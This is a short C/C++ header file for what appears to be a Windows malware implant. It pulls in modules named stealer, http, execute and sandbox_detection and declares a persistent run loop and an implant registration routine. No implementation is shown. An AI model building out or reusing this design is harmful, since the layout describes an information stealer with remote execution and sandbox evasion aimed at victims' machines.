#ifndef IMPLANT_H
#define IMPLANT_H

/* Standard Header Files */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <sstream>

/* Libraries */
#include "nlohmann/json.hpp"

using json = nlohmann::json;

/* Variables */
#define IMPLANT_ID 1

/* Header files of Implementations */
#include "stealer/stealer.h"
#include "http/http.h"
#include "execute/execute.h"
#include "sandbox_detection/sandbox_detection.h"

/* Functions */
void IWillRunForever(void);
void registerimplant(void);


#endif